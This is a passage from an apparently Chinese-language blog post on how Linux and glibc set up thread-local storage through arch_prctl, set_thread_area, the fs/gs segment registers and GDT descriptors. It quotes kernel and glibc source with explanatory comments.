     \</span><br><span class="line">     <span class="keyword">asm</span> <span class="keyword">volatile</span> (<span class="string">&quot;syscall&quot;</span>						      \</span><br><span class="line">		   : <span class="string">&quot;=a&quot;</span> (_result)					      \</span><br><span class="line">		   : <span class="string">&quot;0&quot;</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>) __NR_arch_prctl),		      \</span><br><span class="line">		     <span class="string">&quot;D&quot;</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span>) ARCH_SET_FS),		      \</span><br><span class="line">		     <span class="string">&quot;S&quot;</span> (_thrdescr)					      \</span><br><span class="line">		   : <span class="string">&quot;memory&quot;</span>, <span class="string">&quot;cc&quot;</span>, <span class="string">&quot;r11&quot;</span>, <span class="string">&quot;cx&quot;</span>);			      \</span><br><span class="line">									      \</span><br><span class="line">    _result ? <span class="string">&quot;cannot set %fs base address for thread-local storage&quot;</span> : <span class="number">0</span>;     \</span><br><span class="line">  &#125;)</span><br><span class="line">  ......</span><br><span class="line">  <span class="comment">// arch_prctl系统调用实现代码</span></span><br><span class="line">  <span class="function"><span class="keyword">long</span> <span class="title">do_arch_prctl</span><span class="params">(struct task_struct *task, <span class="keyword">int</span> code, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> doit = task == current;</span><br><span class="line">	<span class="keyword">int</span> cpu;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (code) &#123;</span><br><span class="line">	<span class="keyword">case</span> ARCH_SET_GS:</span><br><span class="line">		<span class="keyword">if</span> (addr &gt;= TASK_SIZE_OF(task))</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line">		cpu = get_cpu();</span><br><span class="line">		<span class="comment">/* handle small bases via the GDT because that&#x27;s faster to</span></span><br><span class="line"><span class="comment">		   switch. */</span></span><br><span class="line">		<span class="keyword">if</span> (addr &lt;= <span class="number">0xffffffff</span>) &#123;</span><br><span class="line">			set_32bit_tls(task, GS_TLS, addr);</span><br><span class="line">			<span class="keyword">if</span> (doit) &#123;</span><br><span class="line">				load_TLS(&amp;task-&gt;thread, cpu);</span><br><span class="line">				load_gs_index(GS_TLS_SEL);</span><br><span class="line">			&#125;</span><br><span class="line">			task-&gt;thread.gsindex = GS_TLS_SEL;</span><br><span class="line">			task-&gt;thread.gs = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			task-&gt;thread.gsindex = <span class="number">0</span>;</span><br><span class="line">			task-&gt;thread.gs = addr;</span><br><span class="line">			<span class="keyword">if</span> (doit) &#123;</span><br><span class="line">				load_gs_index(<span class="number">0</span>);</span><br><span class="line">				ret = wrmsrl_safe(MSR_KERNEL_GS_BASE, addr);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		put_cpu();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> ARCH_SET_FS:</span><br><span class="line">		<span class="comment">/* Not strictly needed for fs, but do it for symmetry</span></span><br><span class="line"><span class="comment">		   with gs */</span></span><br><span class="line">		<span class="keyword">if</span> (addr &gt;= TASK_SIZE_OF(task))</span><br><span class="line">			<span class="keyword">return</span> -EPERM;</span><br><span class="line">		cpu = get_cpu();</span><br><span class="line">		<span class="comment">/* handle small bases via the GDT because that&#x27;s faster to</span></span><br><span class="line"><span class="comment">		   switch. */</span></span><br><span class="line">		<span class="keyword">if</span> (addr &lt;= <span class="number">0xffffffff</span>) &#123; <span class="comment">// qemu+64位kernel+busybox+64位可执行程序情况下会进到这个分支，这应该是特殊情况，正式发行版并不会这样</span></span><br><span class="line">			set_32bit_tls(task, FS_TLS, addr); <span class="comment">// 如果是传入的地址为32位，那么说明仍是段寻址，更新gdt中对应段描述符的值(虽然这里是fill_ldt)，从而间接改变基地址</span></span><br><span class="line">			<span class="keyword">if</span> (doit) &#123; </span><br><span class="line">				load_TLS(&amp;task-&gt;thread, cpu);</span><br><span class="line">				loadsegment(fs, FS_TLS_SEL);</span><br><span class="line">			&#125;</span><br><span class="line">			task-&gt;thread.fsindex = FS_TLS_SEL;</span><br><span class="line">			task-&gt;thread.fs = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			task-&gt;thread.fsindex = <span class="number">0</span>;</span><br><span class="line">			task-&gt;thread.fs = addr;</span><br><span class="line">			<span class="keyword">if</span> (doit) &#123; <span class="comment">// 如果发出系统调用的线程恰好为处理器正在执行的线程时，主动将fs置0并加载fsbase值，防止内核切换线程时重复操作</span></span><br><span class="line">				<span class="comment">/* set the selector to 0 to not confuse</span></span><br><span class="line"><span class="comment">				   __switch_to */</span></span><br><span class="line">				loadsegment(fs, <span class="number">0</span>);  <span class="comment">// 装载fs为0</span></span><br><span class="line">				ret = wrmsrl_safe(MSR_FS_BASE, addr); <span class="comment">// 与32位下的处理方式不同，这里直接改写基地址</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		put_cpu();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    (后面省略)</span><br><span class="line">   ......</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_32bit_tls</span><span class="params">(struct task_struct *t, <span class="keyword">int</span> tls, u32 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> <span class="title">ud</span> =</span> &#123;</span><br><span class="line">		.base_addr = addr,</span><br><span class="line">		.limit = <span class="number">0xfffff</span>,</span><br><span class="line">		.seg_32bit = <span class="number">1</span>,</span><br><span class="line">		.limit_in_pages = <span class="number">1</span>,</span><br><span class="line">		.useable = <span class="number">1</span>,</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> *<span class="title">desc</span> =</span> t-&gt;thread.tls_array;</span><br><span class="line">	desc += tls;</span><br><span class="line">	fill_ldt(desc, &amp;ud);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然，内核也会在调度线程时执行检查，确保下一个需要被调度的线程fsindex以及其base值无误</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">*</span><br><span class="line"> *	switch_to(x,y) should <span class="keyword">switch</span> tasks from x to y.</span><br><span class="line"> *</span><br><span class="line"> * This could still be optimized:</span><br><span class="line"> * - fold all the options into a flag word <span class="keyword">and</span> test it with a single test.</span><br><span class="line"> * - could test fs/gs bitsliced</span><br><span class="line"> *</span><br><span class="line"> * Kprobes <span class="keyword">not</span> supported here. Set the probe on schedule instead.</span><br><span class="line"> * Function graph tracer <span class="keyword">not</span> supported too.</span><br><span class="line"> */</span><br><span class="line">__visible __notrace_funcgraph <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *</span></span><br><span class="line"><span class="class">__<span class="title">switch_to</span>(<span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">prev_p</span>, <span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">next_p</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">prev</span> =</span> &amp;prev_p-&gt;thread;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> *<span class="title">next</span> =</span> &amp;next_p-&gt;thread;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">prev_fpu</span> =</span> &amp;prev-&gt;fpu;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fpu</span> *<span class="title">next_fpu</span> =</span> &amp;next-&gt;fpu;</span><br><span class="line">	<span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> *<span class="title">tss</span> =</span> &amp;per_cpu(cpu_tss, cpu);</span><br><span class="line">	<span class="keyword">unsigned</span> fsindex, gsindex;</span><br><span class="line">	<span class="keyword">fpu_switch_t</span> fpu_switch;</span><br><span class="line"></span><br><span class="line">	fpu_switch = switch_fpu_prepare(prev_fpu, next_fpu, cpu);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We must save %fs and %gs before load_TLS() because</span></span><br><span class="line"><span class="comment">	 * %fs and %gs may be cleared by load_TLS().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (e.g. xen_load_tls())</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	savesegment(fs, fsindex);</span><br><span class="line">	savesegment(gs, gsindex);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Load TLS before restoring any segments so that segment loads</span></span><br><span class="line"><span class="comment">	 * reference the correct GDT entries.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	load_TLS(next, cpu);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Leave lazy mode, flushing any hypercalls made here.  This</span></span><br><span class="line"><span class="comment">	 * must be done after loading TLS entries in the GDT but before</span></span><br><span class="line"><span class="comment">	 * loading segments that might reference them, and and it must</span></span><br><span class="line"><span class="comment">	 * be done before fpu__restore(), so the TS bit is up to</span></span><br><span class="line"><span class="comment">	 * date.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	arch_end_context_switch(next_p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Switch DS and ES.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Reading them only returns the selectors, but writing them (if</span></span><br><span class="line"><span class="comment">	 * nonzero) loads the full descriptor from the GDT or LDT.  The</span></span><br><span class="line"><span class="comment">	 * LDT for next is loaded in switch_mm, and the GDT is loaded</span></span><br><span class="line"><span class="comment">	 * above.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * We therefore need to write new values to the segment</span></span><br><span class="line"><span class="comment">	 * registers on every context switch unless both the new and old</span></span><br><span class="line"><span class="comment">	 * values are zero.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Note that we don&#x27;t need to do anything for CS and SS, as</span></span><br><span class="line"><span class="comment">	 * those are saved and restored as part of pt_regs.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	savesegment(es, prev-&gt;es);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(next-&gt;es | prev-&gt;es))</span><br><span class="line">		loadsegment(es, next-&gt;es);</span><br><span class="line"></span><br><span class="line">	savesegment(ds, prev-&gt;ds);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(next-&gt;ds | prev-&gt;ds))</span><br><span class="line">		loadsegment(ds, next-&gt;ds);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Switch FS and GS.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * These are even more complicated than DS and ES: they have</span></span><br><span class="line"><span class="comment">	 * 64-bit bases are that controlled by arch_prctl.  Those bases</span></span><br><span class="line"><span class="comment">	 * only differ from the values in the GDT or LDT if the selector</span></span><br><span class="line"><span class="comment">	 * is 0.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Loading the segment register resets the hidden base part of</span></span><br><span class="line"><span class="comment">	 * the register to 0 or the value from the GDT / LDT.  If the</span></span><br><span class="line"><span class="comment">	 * next base address zero, writing 0 to the segment register is</span></span><br><span class="line"><span class="comment">	 * much faster than using wrmsr to explicitly zero the base.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The thread_struct.fs and thread_struct.gs values are 0</span></span><br><span class="line"><span class="comment">	 * if the fs and gs bases respectively are not overridden</span></span><br><span class="line"><span class="comment">	 * from the values implied by fsindex and gsindex.  They</span></span><br><span class="line"><span class="comment">	 * are nonzero, and store the nonzero base addresses, if</span></span><br><span class="line"><span class="comment">	 * the bases are overridden.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * (fs != 0 &amp;&amp; fsindex != 0) || (gs != 0 &amp;&amp; gsindex != 0) should</span></span><br><span class="line"><span class="comment">	 * be impossible.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Therefore we need to reload the segment registers if either</span></span><br><span class="line"><span class="comment">	 * the old or new selector is nonzero, and we need to override</span></span><br><span class="line"><span class="comment">	 * the base address if next thread expects it to be overridden.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * This code is unnecessarily slow in the case where the old and</span></span><br><span class="line"><span class="comment">	 * new indexes are zero and the new base is nonzero -- it will</span></span><br><span class="line"><span class="comment">	 * unnecessarily write 0 to the selector before writing the new</span></span><br><span class="line"><span class="comment">	 * base address.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Note: This all depends on arch_prctl being the only way that</span></span><br><span class="line"><span class="comment">	 * user code can override the segment base.  Once wrfsbase and</span></span><br><span class="line"><span class="comment">	 * wrgsbase are enabled, most of this code will need to change.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(fsindex | next-&gt;fsindex | prev-&gt;fs)) &#123; <span class="comment">// 执行检查</span></span><br><span class="line">		loadsegment(fs, next-&gt;fsindex);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If user code wrote a nonzero value to FS, then it also</span></span><br><span class="line"><span class="comment">		 * cleared the overridden base address.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * <span class="doctag">XXX:</span> if user code wrote 0 to FS and cleared the base</span></span><br><span class="line"><span class="comment">		 * address itself, we won&#x27;t notice and we&#x27;ll incorrectly</span></span><br><span class="line"><span class="comment">		 * restore the prior base address next time we reschdule</span></span><br><span class="line"><span class="comment">		 * the process.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (fsindex)</span><br><span class="line">			prev-&gt;fs = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (next-&gt;fs) <span class="comment">// 如果不为0，则直接更新fsbase的值</span></span><br><span class="line">		wrmsrl(MSR_FS_BASE, next-&gt;fs);</span><br><span class="line">	prev-&gt;fsindex = fsindex;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(gsindex | next-&gt;gsindex | prev-&gt;gs)) &#123;</span><br><span class="line">		load_gs_index(next-&gt;gsindex);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* This works (and fails) the same way as fsindex above. */</span></span><br><span class="line">		<span class="keyword">if</span> (gsindex)</span><br><span class="line">			prev-&gt;gs = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (next-&gt;gs)</span><br><span class="line">		wrmsrl(MSR_KERNEL_GS_BASE, next-&gt;gs);</span><br><span class="line">	prev-&gt;gsindex = gsindex;</span><br><span class="line"></span><br><span class="line">	switch_fpu_finish(next_fpu, fpu_switch);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Switch the PDA and FPU contexts.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	this_cpu_write(current_task, next_p);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Reload esp0 and ss1.  This changes current_thread_info(). */</span></span><br><span class="line">	load_sp0(tss, next);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Now maybe reload the debug registers and handle I/O bitmaps</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(task_thread_info(next_p)-&gt;flags &amp; _TIF_WORK_CTXSW_NEXT ||</span><br><span class="line">		     task_thread_info(prev_p)-&gt;flags &amp; _TIF_WORK_CTXSW_PREV))</span><br><span class="line">		__switch_to_xtra(prev_p, next_p, tss);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (static_cpu_has_bug(X86_BUG_SYSRET_SS_ATTRS)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * AMD CPUs have a misfeature: SYSRET sets the SS selector but</span></span><br><span class="line"><span class="comment">		 * does not update the cached descriptor.  As a result, if we</span></span><br><span class="line"><span class="comment">		 * do SYSRET while SS is NULL, we&#x27;ll end up in user mode with</span></span><br><span class="line"><span class="comment">		 * SS apparently equal to __USER_DS but actually unusable.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * The straightforward workaround would be to fix it up just</span></span><br><span class="line"><span class="comment">		 * before SYSRET, but that would slow down the system call</span></span><br><span class="line"><span class="comment">		 * fast paths.  Instead, we ensure that SS is never NULL in</span></span><br><span class="line"><span class="comment">		 * system call context.  We do this by replacing NULL SS</span></span><br><span class="line"><span class="comment">		 * selectors at every context switch.  SYSCALL sets up a valid</span></span><br><span class="line"><span class="comment">		 * SS, so the only way to get NULL is to re-enter the kernel</span></span><br><span class="line"><span class="comment">		 * from CPL 3 through an interrupt.  Since that can&#x27;t happen</span></span><br><span class="line"><span class="comment">		 * in the same task as a running syscall, we are guaranteed to</span></span><br><span class="line"><span class="comment">		 * context switch between every interrupt vector entry and a</span></span><br><span class="line"><span class="comment">		 * subsequent SYSRET.</span></span><br><span class="line"><span class="comment">		 *</span></span><br><span class="line"><span class="comment">		 * We read SS first because SS reads are much faster than</span></span><br><span class="line"><span class="comment">		 * writes.  Out of caution, we force SS to __KERNEL_DS even if</span></span><br><span class="line"><span class="comment">		 * it previously had a different non-NULL value.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">short</span> ss_sel;</span><br><span class="line">		savesegment(ss, ss_sel);</span><br><span class="line">		<span class="keyword">if</span> (ss_sel != __KERNEL_DS)</span><br><span class="line">			loadsegment(ss, __KERNEL_DS);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> prev_p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在更新版本的内核中，<code>arch_prctl</code>将只为x86_64系统上运行的64位程序提供调用，其余的(x86_64下的32位程序,x86下的32位程序)将不能再依靠<code>arch_prctl</code>来更新<code>fs/gs</code>，这一点也可以从glibc针对32位程序的<code>TLS_INIT_TP</code>实现方式中看出，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code to initially initialize the thread pointer.  This might need</span></span><br><span class="line"><span class="comment">   special attention since &#x27;errno&#x27; is not yet available and if the</span></span><br><span class="line"><span class="comment">   operation can cause a failure &#x27;errno&#x27; must not be touched.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TLS_INIT_TP(thrdescr) \</span></span><br><span class="line">  (&#123; <span class="keyword">void</span> *_thrdescr = (thrdescr);					      \</span><br><span class="line">     <span class="keyword">tcbhead_t</span> *_head = _thrdescr;					      \</span><br><span class="line">     <span class="keyword">union</span> user_desc_init _segdescr;					      \</span><br><span class="line">     <span class="keyword">int</span> _result;							      \</span><br><span class="line">									      \</span><br><span class="line">     _head-&gt;tcb = _thrdescr;						      \</span><br><span class="line">     <span class="comment">/* For now the thread descriptor is at the same address.  */</span>	      \</span><br><span class="line">     _head-&gt;self = _thrdescr;						      \</span><br><span class="line">     <span class="comment">/* New syscall handling support.  */</span>				      \</span><br><span class="line">     INIT_SYSINFO;							      \</span><br><span class="line">									      \</span><br><span class="line">     <span class="comment">/* Let the kernel pick a value for the &#x27;entry_number&#x27; field.  */</span>	      \</span><br><span class="line">     tls_fill_user_desc (&amp;_segdescr, <span class="number">-1</span>, _thrdescr);			      \</span><br><span class="line">									      \</span><br><span class="line">     <span class="comment">/* Install the TLS.  */</span>						      \</span><br><span class="line">     INTERNAL_SYSCALL_DECL (err);					      \</span><br><span class="line">     _result = INTERNAL_SYSCALL (set_thread_area, err, <span class="number">1</span>, &amp;_segdescr.desc);   \</span><br><span class="line">									      \</span><br><span class="line">     <span class="keyword">if</span> (_result == <span class="number">0</span>)							      \</span><br><span class="line">       <span class="comment">/* We know the index in the GDT, now load the segment register.	      \</span></span><br><span class="line"><span class="comment">	  The use of the GDT is described by the value 3 in the lower	      \</span></span><br><span class="line"><span class="comment">	  three bits of the segment descriptor value.			      \</span></span><br><span class="line"><span class="comment">									      \</span></span><br><span class="line"><span class="comment">	  Note that we have to do this even if the numeric value of	      \</span></span><br><span class="line"><span class="comment">	  the descriptor does not change.  Loading the segment register	      \</span></span><br><span class="line"><span class="comment">	  causes the segment information from the GDT to be loaded	      \</span></span><br><span class="line"><span class="comment">	  which is necessary since we have changed it.   */</span>		      \</span><br><span class="line">       TLS_SET_GS (_segdescr.desc.entry_number * <span class="number">8</span> + <span class="number">3</span>);		      \</span><br><span class="line">									      \</span><br><span class="line">     _result == <span class="number">0</span> ? <span class="literal">NULL</span>						      \</span><br><span class="line">     : <span class="string">&quot;set_thread_area failed when setting up thread-local storage\n&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>在32位程序中，glibc通过修改gdt中的段描述符以及gs段寄存器的值来确保gsbase指向tcb基地址(64位程序使用fs寄存器，32位程序使用gs寄存器)</p>
<p>并且，由于段描述符是由glibc提供，所以内核在收到<code>INTERNAL_SYSCALL (set_thread_area, err, 1, &amp;_segdescr.desc)</code>所执行的请求后，除了会分配一个entry给glibc以外，也会把glibc提供的信息保存一份至该进程的<code>task_struct -&gt; thread -&gt; tls_array</code>成员中,在线程切换时，内核将会用这份保存的段描述符更新gdt表，从而实现一个entry对应N个线程</p>
<p>以下是部分相关代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">(无关成员太多，省略)</span><br><span class="line">	<span class="keyword">int</span> pagefault_disabled;</span><br><span class="line"><span class="comment">/* CPU-specific state of this task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> <span class="title">thread</span>;</span> <span class="comment">// 此成员记录了线程的寄存器状态及tls状态等</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * WARNING: on x86, &#x27;thread_struct&#x27; contains a variable-sized</span></span><br><span class="line"><span class="comment"> * structure.  It *MUST* be at the end of &#x27;task_struct&#x27;.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Do not put anything below here!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> &#125;</span><br><span class="line">......</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread_struct</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Cached TLS descriptors: */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>	<span class="title">tls_array</span>[<span class="title">GDT_ENTRY_TLS_ENTRIES</span>];</span> <span class="comment">// 段描述符信息被保存在此成员中</span></span><br><span class="line">  